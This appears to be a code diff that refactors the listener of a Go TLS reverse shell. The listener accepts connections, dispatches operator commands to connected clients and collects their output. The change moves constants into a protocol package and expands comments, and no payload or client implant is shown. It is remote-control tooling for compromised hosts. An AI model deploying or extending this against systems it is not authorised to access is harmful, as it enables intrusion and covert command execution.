@@ -11,9 +11,12 @@ import (
 	"strings"
 	"sync"
 	"time"
+
+	"golang-https-rev/pkg/protocol"
 )
 
-// Listener represents a reverse shell listener server
+// Listener represents a TLS reverse shell listener server that accepts client connections,
+// manages them, and dispatches commands to connected clients.
 type Listener struct {
 	port              string
 	networkInterface  string
@@ -23,7 +26,8 @@ type Listener struct {
 	mutex             sync.Mutex
 }
 
-// NewListener creates a new reverse shell listener
+// NewListener creates a new reverse shell listener with the given port,
+// network interface, and TLS configuration.
 func NewListener(port, networkInterface string, tlsConfig *tls.Config) *Listener {
 	return &Listener{
 		port:              port,
@@ -34,14 +38,15 @@ func NewListener(port, networkInterface string, tlsConfig *tls.Config) *Listener
 	}
 }
 
-// Start begins listening for client connections
+// Start begins listening for client connections on the configured port and interface.
+// It returns the underlying net.Listener and starts accepting connections in a background goroutine.
 func (l *Listener) Start() (net.Listener, error) {
 	address := fmt.Sprintf("%s:%s", l.networkInterface, l.port)
 	log.Printf("Starting TLS listener on %s", address)
 
 	listener, err := tls.Listen("tcp", address, l.tlsConfig)
 	if err != nil {
-		return nil, fmt.Errorf("failed to create TLS listener: %v", err)
+		return nil, fmt.Errorf("failed to create TLS listener: %w", err)
 	}
 
 	go l.acceptConnections(listener)
@@ -84,8 +89,8 @@ func (l *Listener) handleClient(conn net.Conn) {
 		log.Printf("[-] Client disconnected: %s", clientAddr)
 	}()
 
-	reader := bufio.NewReaderSize(conn, 1024*1024) // 1MB read buffer for large file transfers
-	writer := bufio.NewWriterSize(conn, 1024*1024) // 1MB write buffer
+	reader := bufio.NewReaderSize(conn, protocol.BufferSize1MB)
+	writer := bufio.NewWriterSize(conn, protocol.BufferSize1MB)
 
 	// Track if response reader goroutine has failed
 	readerFailed := make(chan bool, 1)
@@ -101,8 +106,8 @@ func (l *Listener) handleClient(conn net.Conn) {
 
 			// If the buffer filled before we hit a newline, keep reading without closing the connection
 			if errors.Is(err, bufio.ErrBufferFull) {
-				if responseBuffer.Len() > 10*1024*1024 { // avoid unbounded growth
-					log.Printf("Response from client %s exceeds 10MB without delimiter; resetting buffer", clientAddr)
+				if responseBuffer.Len() > protocol.MaxBufferSize {
+					log.Printf("Response from client %s exceeds max buffer size without delimiter; resetting buffer", clientAddr)
 					responseBuffer.Reset()
 				}
 				continue
@@ -117,11 +122,11 @@ func (l *Listener) handleClient(conn net.Conn) {
 			}
 
 			// Check if we've reached the end of output marker anywhere in the buffer
-			if strings.Contains(responseBuffer.String(), "<<<END_OF_OUTPUT>>>") {
+			if strings.Contains(responseBuffer.String(), protocol.EndOfOutputMarker) {
 				fullResponse := responseBuffer.String()
 				select {
 				case respChan <- fullResponse:
-				case <-time.After(5 * time.Second):
+				case <-time.After(protocol.ResponseTimeout * time.Second):
 					log.Printf("Warning: response channel full or blocked for client %s", clientAddr)
 				}
 				responseBuffer.Reset()
@@ -139,20 +144,20 @@ func (l *Listener) handleClient(conn net.Conn) {
 			fmt.Fprintf(writer, "%s\n", cmd)
 			writer.Flush()
 
-			if cmd == "exit" {
+			if cmd == protocol.CmdExit {
 				return
 			}
 		case <-readerFailed:
 			log.Printf("Reader failed for client %s, closing connection", clientAddr)
 			return
-		case <-time.After(30 * time.Second):
-			fmt.Fprintf(writer, "PING\n")
+		case <-time.After(protocol.PingInterval * time.Second):
+			fmt.Fprintf(writer, "%s\n", protocol.CmdPing)
 			writer.Flush()
 		}
 	}
 }
 
-// GetClients returns a list of connected client addresses
+// GetClients returns a list of currently connected client addresses.
 func (l *Listener) GetClients() []string {
 	l.mutex.Lock()
 	defer l.mutex.Unlock()
@@ -164,7 +169,8 @@ func (l *Listener) GetClients() []string {
 	return clients
 }
 
-// SendCommand sends a command to a specific client
+// SendCommand sends a command to a specific client identified by its address.
+// It returns an error if the client is not found or if the send times out.
 func (l *Listener) SendCommand(clientAddr, cmd string) error {
 	l.mutex.Lock()
 	cmdChan, exists := l.clientConnections[clientAddr]
@@ -177,12 +183,13 @@ func (l *Listener) SendCommand(clientAddr, cmd string) error {
 	select {
 	case cmdChan <- cmd:
 		return nil
-	case <-time.After(5 * time.Second):
+	case <-time.After(protocol.ResponseTimeout * time.Second):
 		return fmt.Errorf("timeout sending command")
 	}
 }
 
-// GetResponse gets the response from a client
+// GetResponse waits for and returns the response from a client within the given timeout.
+// It returns an error if the client is not found or if the timeout is exceeded.
 func (l *Listener) GetResponse(clientAddr string, timeout time.Duration) (string, error) {
 	l.mutex.Lock()
 	respChan, exists := l.clientResponses[clientAddr]
